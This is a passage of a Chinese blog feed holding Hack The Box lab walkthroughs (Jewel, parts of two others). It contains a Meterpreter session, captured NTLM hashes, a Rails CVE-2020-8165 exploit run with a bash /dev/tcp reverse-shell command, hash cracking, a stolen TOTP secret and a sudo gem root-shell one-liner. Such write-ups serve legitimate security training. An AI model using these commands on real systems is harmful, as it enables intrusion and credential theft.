class="hljs-string">&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>然后将其通过burpsuite发送，smb共享目录中如果出现以下信息则表示目标访问了我启动的smb共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Incoming connection (10.10.10.158,49712)<br>[*] AUTHENTICATE_MESSAGE (JSON\userpool,JSON)<br>[*] User JSON\userpool authenticated successfully<br>[*] userpool::JSON:aaaaaaaaaaaaaaaa:1975aeb1e7ccda72722d6f7219a9ff7a:010100000000000080756f58944cd80148b2b38ce56d992300000000010010004a006400780074004f0044006a007200030010004a006400780074004f0044006a0072000200100076006b004b006d0047006900590058000400100076006b004b006d0047006900590058000700080080756f58944cd80106000400020000000800300030000000000000000000000000300000dfbb05e9e77b2854b41933c307abd332ab641a0af5e539c003d77a77ac01757d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000<br></code></pre></td></tr></table></figure><p>Metasploit中即可收到Meterpreter会话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Started reverse TCP handler on 10.10.16.9:4444 <br>[*] Sending stage (175174 bytes) to 10.10.10.158<br>[*] Meterpreter session 1 opened (10.10.16.9:4444 -&gt; 10.10.10.158:49713 ) at 2022-04-10 12:35:26 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>windows提权机制很多很多，我之前也写过很多了，就不再写了。这里可以直接通过getsystem获取到system权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getsystem<br>...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>User.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs BASH">c:\Users\userpool\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is B219-32A3<br><br> Directory of c:\Users\userpool\Desktop<br><br>05/22/2019  05:07 PM    &lt;DIR&gt;          .<br>05/22/2019  05:07 PM    &lt;DIR&gt;          ..<br>05/22/2019  05:07 PM                32 user.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  20,318,572,544 bytes free<br><br>c:\Users\userpool\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><span class="hljs-built_in">type</span> user.txt<br></code></pre></td></tr></table></figure><p>Root.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs BASH">c:\Users\superadmin&gt;<span class="hljs-built_in">cd</span> desktop<br><span class="hljs-built_in">cd</span> desktop<br><br>c:\Users\superadmin\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is B219-32A3<br><br> Directory of c:\Users\superadmin\Desktop<br><br>03/17/2021  07:59 AM    &lt;DIR&gt;          .<br>03/17/2021  07:59 AM    &lt;DIR&gt;          ..<br>05/22/2019  05:06 PM                32 root.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  20,318,568,448 bytes free<br><br>c:\Users\superadmin\Desktop&gt;<span class="hljs-built_in">type</span> root.txt<br><span class="hljs-built_in">type</span> root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Jewel</title>
    <link href="/post/HackTheBox-Jewel.html"/>
    <url>/post/HackTheBox-Jewel.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap 7.92 scan initiated Sun Apr 10 13:17:04 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.211<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.211<br>Host is up (0.17s latency).<br>Not shown: 65532 filtered tcp ports (no-response)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)<br>|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)<br>|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)<br>8000/tcp open  http    Apache httpd 2.4.38<br>|_http-generator: gitweb/2.20.1 git/2.20.1<br>| http-title: 10.10.10.211 Git<br>|_Requested resource was http://10.10.10.211:8000/gitweb/<br>| http-open-proxy: Potentially OPEN proxy.<br>|_Methods supported:CONNECTION<br>|_http-server-header: Apache/2.4.38 (Debian)<br>8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)<br>|_http-title: BL0G!<br>|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6<br>Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Apr 10 13:20:33 2022 -- 1 IP address (1 host up) scanned in 209.10 seconds</span><br></code></pre></td></tr></table></figure><p>22端口用户名枚举漏洞，先跳过。8000端口Apache httpd 2.4.38，8080端口nginx 1.14.2 (Phusion Passenger 6.0.6)，</p><p>8000：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140344132.png" alt="image-20220410140344132"  /><p>8080：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140400741.png" alt="image-20220410140400741"  /><p>在两个web页面中来回探索，我发现了一个bill(比尔)的用户，这或许是一个潜在的用户名，然后我误打误撞找到了以下页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.10.211:8000/gitweb/?p=.git;a=commitdiff_plain;h=HEAD<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410152614257.png" alt="image-20220410152614257"  /><p>这就足以让我锁定一个CVE漏洞了：</p><p>Ruby on Rails 反序列化远程代码执行漏洞，CVE-2020-8165。</p><p>但是我在网上并没有找到该漏洞的相关说明，或是一笔带过，或是含糊不清。这便是我搜寻了很多资料最终都只有这一句：</p><p>rails &lt; 5.2.4.3、rails &lt; 6.0.3.1 中存在不可信数据漏洞的反序列化，这可能允许攻击者在 MemCacheStore 和 RedisCacheStore 中解组用户提供的对象，从而可能导致 RCE。</p><p>很抱歉这次我也无法研究该漏洞究竟为何产生，因为我也不知道。我只找到了如下漏洞利用脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/hybryx/CVE-2020-8165/blob/main/exploit.py<br></code></pre></td></tr></table></figure><p>账户可以在以下页面注册：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.10.211:8080/signup<br></code></pre></td></tr></table></figure><p>脚本中我也看不出该漏洞究竟为何，因为它只要求我提供目标ID，我注册的用户口令，目标端口以及要执行的命令。它的利用方法很简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py 10.10.10.211 8080 worldisend@qq.com worldisend <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.9/8989 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 8989                                     <br>listening on [any] 8989 ...<br>connect to [10.10.16.9] from (UNKNOWN) [10.10.10.211] 47642<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (792): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bill@jewel:~/blog$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>bill<br>bill@jewel:~/blog$ <br></code></pre></td></tr></table></figure><p>就这样，我稀里糊涂就获得了目标的反向shell，没有漏洞原理，没有反序列化注入点。</p><p>user.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:/home$ <span class="hljs-built_in">cd</span> bill                                                                                                                                                                   <br><span class="hljs-built_in">cd</span> bill                                                                                                                                                                                     <br>bill@jewel:~$ <span class="hljs-built_in">ls</span>                                                                                                                                                                            <br><span class="hljs-built_in">ls</span>                                                                                                                                                                                          <br>blog                                                                                                                                                                                        <br>user.txt<br>bill@jewel:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><p>在备份目录可以看到一堆备份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:/var/backups$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 2468<br>drwxr-xr-x  2 root root     4096 Apr 10 08:26 .<br>drwxr-xr-x 12 root root     4096 Aug 27  2020 ..<br>-rw-r--r--  1 root root    81920 Aug 26  2020 alternatives.tar.0<br>-rw-r--r--  1 root root    51600 Sep 17  2020 apt.extended_states.0<br>-rw-r--r--  1 root root     5415 Aug 28  2020 apt.extended_states.1.gz<br>-rw-r--r--  1 root root     5363 Aug 27  2020 apt.extended_states.2.gz<br>-rw-r--r--  1 root root      252 Aug 26  2020 dpkg.diversions.0<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.1.gz<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.2.gz<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.3.gz<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.4.gz<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.5.gz<br>-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.6.gz<br>-rw-r--r--  1 root root      173 Aug 26  2020 dpkg.statoverride.0<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.1.gz<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.2.gz<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.3.gz<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.4.gz<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.5.gz<br>-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.6.gz<br>-rw-r--r--  1 root root   910140 Feb  8  2021 dpkg.status.0<br>-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.1.gz<br>-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.2.gz<br>-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.3.gz<br>-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.4.gz<br>-rw-r--r--  1 root root   226834 Sep 17  2020 dpkg.status.5.gz<br>-rw-r--r--  1 root root   222736 Aug 28  2020 dpkg.status.6.gz<br>-rw-r--r--  1 root root     7828 Aug 27  2020 dump_2020-08-27.sql<br>-rw-------  1 root root      763 Aug 27  2020 group.bak<br>-rw-------  1 root shadow    637 Aug 27  2020 gshadow.bak<br>-rw-------  1 root root     1670 Aug 26  2020 passwd.bak<br>-rw-------  1 root shadow   1059 Aug 28  2020 shadow.bak<br>bill@jewel:/var/backups$ <br></code></pre></td></tr></table></figure><p>在dump_2020-08-27.sql中会有两串哈希：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">COPY public.users (<span class="hljs-built_in">id</span>, username, email, created_at, updated_at, password_digest) FROM stdin;<br>2       jennifer        jennifer@mail.htb       2020-08-27 05:44:28.551735      2020-08-27 05:44:28.551735      $2a$12<span class="hljs-variable">$sZac9R2VSQYjOcBTTUYy6</span>.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO<br>1       bill    bill@mail.htb   2020-08-26 10:24:03.878232      2020-08-27 09:18:11.636483      $2a$12<span class="hljs-variable">$QqfetsTSBVxMXpnTR</span>.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW<br></code></pre></td></tr></table></figure><p>jennifer的哈希并没有碰撞出来，但是bill的哈希我碰撞了出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 3200 ./hash2.txt /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$2a$12<span class="hljs-variable">$QqfetsTSBVxMXpnTR</span>.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob<br></code></pre></td></tr></table></figure><p>我可以尝试一下sudo -l，它会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo: no <span class="hljs-built_in">tty</span> present and no askpass program specified<br></code></pre></td></tr></table></figure><p>我可以升级一下shell解决这个问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:/var$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> bill: spongebob<br><br>Verification code: <br></code></pre></td></tr></table></figure><p>好吧，看起来它还需要另一种验证，我记得我之前在用户根目录发现过这个：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-r-------- <span class="hljs-number"> 1 </span>bill bill  <span class="hljs-number"> 56 </span>Aug<span class="hljs-number"> 28 </span><span class="hljs-number"> 2020 </span>.google_authenticator<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:~$ <span class="hljs-built_in">cat</span> .google_authenticator<br><span class="hljs-built_in">cat</span> .google_authenticator<br>2UQI3R52WFCLE6JTLDCSJYMJH4<br><span class="hljs-string">&quot; WINDOW_SIZE 17</span><br><span class="hljs-string">&quot;</span> TOTP_AUTH<br>bill@jewel:~$ <br></code></pre></td></tr></table></figure><p>我觉得它像是在为Google打广告，可以到Google浏览器下载GAuth Authenticator插件。然后输入：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164449160.png" alt="image-20220410164449160"  /><p>我就会拥有一个类似于QQ安全中心的动态六位验证码，每过十几秒就会刷新一次：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164617835.png" alt="image-20220410164617835"  /><p>然后我就可以成功的使用sudo了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:~$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> bill: <br><br>I think ... err ... I think ... I think I<span class="hljs-string">&#x27;ll go home</span><br><span class="hljs-string">[sudo] password for bill: </span><br><span class="hljs-string"></span><br><span class="hljs-string">I feel much better now.</span><br><span class="hljs-string">[sudo] password for bill: spongebob</span><br><span class="hljs-string"></span><br><span class="hljs-string">Verification code: 627125</span><br><span class="hljs-string"></span><br><span class="hljs-string">Matching Defaults entries for bill on jewel:</span><br><span class="hljs-string">    env_reset, mail_badpass,</span><br><span class="hljs-string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="hljs-string">    insults</span><br><span class="hljs-string"></span><br><span class="hljs-string">User bill may run the following commands on jewel:</span><br><span class="hljs-string">    (ALL : ALL) /usr/bin/gem</span><br><span class="hljs-string">bill@jewel:~$ </span><br></code></pre></td></tr></table></figure><p>但是我sudo也只能使用&#x2F;usr&#x2F;bin&#x2F;gem。我从以下网址中获取到了gem的使用信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://gtfobins.github.io/gtfobins/gem/<br></code></pre></td></tr></table></figure><p>我可以这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /usr/bin/gem open -e <span class="hljs-string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">bill@jewel:~$ sudo /usr/bin/gem open -e <span class="hljs-string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc                            <br>sudo /usr/bin/gem open -e <span class="hljs-string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>root.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Jeeves</title>
    <link href="/post/HackTheBox-Jeeves.html"/>
    <url>/post/HackTheBox-Jeeves.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Jeeves.png" alt="Jeeves"></p><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 <br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 13:53:52 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 445/tcp on 10.10.10.63                                    <br>Discovered open port 80/tcp on 10.10.10.63                                     <br>Discovered open port 135/tcp on 10.10.10.63   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 21:57 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.63<br>Host is up (0.11s latency).<br><br>PORT    STATE SERVICE      VERSION<br>80/tcp  open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Ask Jeeves<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>135/tcp open  msrpc        Microsoft Windows RPC<br>445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-29T18:57:15<br>|_  start_date: 2022-08-29T18:53:39<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.97 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -I http://10.10.10.63/                                                                                             <br>HTTP/1.1 200 OK<br>Content-Length: 503<br>Content-Type: text/html<br>Last-Modified: Mon, 06 Nov 2017 02:34:40 GMT<br>Accept-Ranges: bytes<br>ETag: <span class="hljs-string">&quot;2277f7cba756d31:0&quot;</span><br>Server: Microsoft-IIS/10.0<br>Date: Mon, 29 Aug 2022 18:57:31 GMT<br></code></pre></td></tr></table></figure><p>假搜索框：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829220118485.png" alt="image-20220829220118485"></p><p>根本就不会像后端提交任何数据，而是无论输入什么都会跳转到一个错误信息的图片。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ dirsearch -u http://10.10.10.63 <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.63/_22-08-29_22-01-29.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-29_22-01-29.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.63/<br><br>[22:01:29] Starting: <br>[22:01:30] 403 -  312B  - /%2e%2e//google.com<br>[22:01:56] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[22:02:39] 200 -   50B  - /error.html<br>[22:02:50] 200 -  503B  - /index.html<br></code></pre></td></tr></table></figure><p>但也没有一些目录信息。搜索漏洞会有一个溢出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ searchsploit Jeeves           <br>----------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                       |  Path<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                          | windows/remote/4452.html<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 